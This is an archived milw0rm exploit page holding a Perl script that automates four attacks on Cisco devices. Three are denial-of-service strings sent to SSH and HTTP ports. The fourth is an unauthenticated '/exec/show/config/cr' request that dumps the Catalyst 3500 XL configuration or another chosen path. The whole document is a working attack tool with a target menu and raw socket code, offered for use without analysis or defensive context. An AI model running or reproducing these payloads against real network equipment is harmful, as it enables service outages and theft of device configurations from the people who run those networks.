<html><head><title>Cisco Multiple Products Automated Exploit Tool</title></head><pre>#!/usr/bin/perl
#
# Written by hypoclear - http://hypoclear.cjb.net
# Thong-th-thong-th-thong.pl AKA thong.pl is a PERL script 
# which automates several attacks against various Cisco products.  
# To be specific:
#
# 12-13-00 - Cisco Catalyst ssh Protocol Mismatch DoS Vulnerability
# 11-28-00 - Cisco 675 Web Administration Denial of Service Vulnerability
# 10-26-00 - Cisco Catalyst 3500 XL Remote Arbitrary Command
# 10-25-00 - Cisco IOS Software HTTP Request DoS Vulnerability 
#
#   usage: ./thong.pl -h &lt;host&gt;

use IO::Socket; use Getopt::Std;
getopts('h:');

if (defined $opt_h)
 {
  $HOST = $opt_h; 
  $PORT; 
  $STRING = &quot;&quot;; 
  $menu_opt = &quot;&quot;;

  menu();
  computeOption();
  exploit();
 }

else {print &quot;\n\n usage ./thong.pl -h &lt;host&gt;\n\n&quot;}

sub menu 
{
  print &quot;\n\n     DATE     VULNERABILITY
  1. 12-13-00 - Cisco Catalyst ssh Protocol Mismatch DoS Vulnerability
  2. 11-28-00 - Cisco 675 Web Administration Denial of Service Vulnerability
  3. 10-26-00 - Cisco Catalyst 3500 XL Remote Arbitrary Command
  4. 10-25-00 - Cisco IOS Software HTTP Request DoS Vulnerability  

  Enter Option: &quot;;
  $menu_opt = &lt;STDIN&gt;;
  chomp ($menu_opt);
}

sub computeOption
{
  if    ($menu_opt == &quot;1&quot;){$PORT = 22; $STRING = &quot;this ain't SSH&quot;;}
  elsif ($menu_opt == &quot;2&quot;){$PORT = 80; $STRING = &quot;GET ? HTTP/1.0\n\n&quot;;}
  elsif ($menu_opt == &quot;3&quot;){$PORT = 80; three();}
  elsif ($menu_opt == &quot;4&quot;){$PORT = 80; $STRING = &quot;GET /error?/ HTTP/1.0\n\n&quot;;}
  else  {print &quot;Select a real option!\n&quot;; menu();}
}

sub three
{
  print &quot;Enter file to read or enter D for default (/show/config/cr): &quot;;
  $key = &lt;STDIN&gt;;
  chomp ($key);
  print &quot;\nGetting $key...&quot;;

  if (($key eq &quot;D&quot;)||($key eq &quot;d&quot;))
  {
    print &quot;\nGetting /show/config/cr...\n&quot;; 
    $STRING = &quot;GET /exec/show/config/cr HTTP/1.0\n\n&quot;;
  }
  else 
  {
    print &quot;\nGetting $key...\n&quot;;
    $STRING = &quot;GET /exec$key HTTP/1.0\n\n&quot;;
  }
}

sub exploit
{
  print &quot;\n\ntrying to exploit $HOST...\n&quot;;
 
  $SOCKET = IO::Socket::INET-&gt;new(PeerAddr =&gt; $HOST,
                                  PeerPort =&gt; $PORT,
                                  Proto    =&gt; &quot;tcp&quot;)
         || die &quot;Couldn't connect to $HOST\n&quot;;

  print &quot;\n$STRING\n&quot;;
  print $SOCKET &quot;$STRING&quot;;
 
  if ($menu_opt == 3){while (&lt;$SOCKET&gt;){print}}
  close($SOCKET);
}


# milw0rm.com [2001-01-27]</pre></html>